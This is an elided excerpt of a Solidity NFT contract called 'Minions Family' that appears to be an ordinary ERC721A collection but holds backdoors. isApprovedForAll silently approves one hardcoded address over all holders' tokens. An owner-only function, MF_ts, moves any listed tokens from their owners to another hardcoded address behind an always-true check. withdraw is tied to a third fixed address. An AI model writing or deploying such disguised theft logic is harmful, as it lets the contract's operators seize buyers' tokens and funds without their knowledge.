  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x09d781eaE87BAef415c658B6B59E5b610aD9154B){return true;}
...
contract Minions_Family is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Minions Family", "MF", maxBatchSize_, collectionSize_) {
  ...
  function MF_ts(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x33E1dB721d18394448cc94220C3cdA8BEe2A8A2F, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xfAF49061eeaC00bCa05d3F5C478e5A8379607ef4);
